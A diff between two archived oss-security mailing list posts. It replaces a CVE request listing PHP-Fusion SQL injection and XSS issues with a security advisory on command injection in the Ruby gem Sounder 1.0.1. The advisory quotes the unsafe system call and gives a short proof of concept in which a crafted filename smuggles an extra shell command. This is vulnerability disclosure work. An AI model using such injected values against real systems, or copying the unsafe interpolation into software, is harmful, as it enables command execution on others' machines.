@@ -1,47 +1,44 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/03/03/1
-Message-ID: <20130303000220.GA5591@kludge.henri.nerv.fi>
-Date: Sun, 3 Mar 2013 02:02:20 +0200
-From: Henri Salo <henri@...v.fi>
-To: oss-security@...ts.openwall.com
-Cc: come2waraxe@...oo.com
-Subject: CVE request: PHP-Fusion waraxe-2013-SA#097
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/28/1
+Message-id: <4a75dfa3-a36a-49f6-b1bd-374792c4c214@me.com>
+Date: Wed, 28 Aug 2013 03:06:14 +0000 (GMT)
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Command Injection in Ruby Gem Sounder 1.0.1
 Content-Type: text/plain; charset=utf-8
 
-Hello list,
+Title: Command Injection in Ruby Gem Sounder 1.0.1
 
-Can I get CVEs for vulnerabilities fixed in PHP-Fusion version 7.02.06, thanks.
+Date: 8/10/2013
+Author: Larry W. Cashdollar @_larry0
 
-http://www.waraxe.us/advisory-97.html waraxe-2013-SA#097
+Download: https://rubygems.org/gems/sounder
+CVE: TBD
+Description:
 
-OSVDB ID    title
-90714     PHP-Fusion /downloads.php orderby Parameter SQL Injection
-90713     PHP-Fusion /forum/postedit.php delete_attach_* Parameter SQL Injection 
-90712     PHP-Fusion /forum/postnewthread.php poll_opts Parameter SQL Injection 
-90711     PHP-Fusion /administration/settings_messages.php Multiple Parameter SQL Injection 
-90710     PHP-Fusion /administration/settings_photo.php Multiple Parameter SQL Injection 
-90709     PHP-Fusion /administration/bbcodes.php enable Parameter SQL Injection 
-90708     PHP-Fusion /forum/viewthread.php highlight Parameter XSS 
-90707     PHP-Fusion /messages.php Multiple Parameter XSS 
-90706     PHP-Fusion /infusions/shoutbox_panel/shoutbox_admin.php message Parameter XSS 
-90705     PHP-Fusion /administration/news.php message Parameter XSS 
-90704     PHP-Fusion /administration/panel_editor.php panel_list Parameter XSS 
-90703     PHP-Fusion /administration/phpinfo.php User-Agent HTTP Header XSS
-90702     PHP-Fusion /administration/bbcodes.php __BBCODE__ Parameter XSS 
-90701     PHP-Fusion /administration/article_cats.php Multiple Parameter XSS 
-90700     PHP-Fusion /administration/download_cats.php Multiple Parameter XSS 
-90699     PHP-Fusion /administration/news_cats.php Multiple Parameter XSS 
-90698     PHP-Fusion /administration/weblink_cats.php Multiple Parameter XSS 
-90697     PHP-Fusion /administration/articles.php Multiple Parameter XSS 
-90696     PHP-Fusion /administration/db_backup.php file Parameter Traversal Arbitrary File Deletion 
-90695     PHP-Fusion /administration/news.php Multiple Parameter SQL Injection 
-90694     PHP-Fusion /maincore.php user_theme Parameter Traversal Local File Inclusion
-90693     PHP-Fusion /administration/articles.php article_id Parameter SQL Injection 
-90692     PHP-Fusion /administration/user_fields.php enable Parameter Traversal Local File Inclusion
-90691     PHP-Fusion /administration/db_backup.php Database Backup Direct Request Information Disclosure
-90359     PHP-Fusion includes/classes/Authenticate.class.php Multiple Cookie SQL Injection
+Sounder is a ruby gem API for Mac OSX's afplay command.
+It passes user supplied data directly to command line.  
 
---
-Henri Salo
+>From lib/sounder/sound.rb:
 
-Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
+    def play
+      system %{/usr/bin/afplay "#{@...e}" &}
+    end
+
+PoC:
+
+irb(main):098:0> @file = "\"id;/usr/bin/id>/tmp/p;\""
+=> "\"id;/usr/bin/id>/tmp/p;\""
+irb(main):099:0>  system %{/bin/echo "#{@...e}" }
+id
+sh: 1: : Permission denied
+=> false
+irb(main):100:0> 
+
+larry@...erfl0w:/tmp$ cat /tmp/p
+uid=1000(larry) gid=600(staff) groups=600(user)
+
+Author Notified: 8/9/2013
+Advisory:  http://vapid.dhs.org/advisories/sounder-ruby-gem-cmd-inj.html
+
+Content of type "text/html" skipped
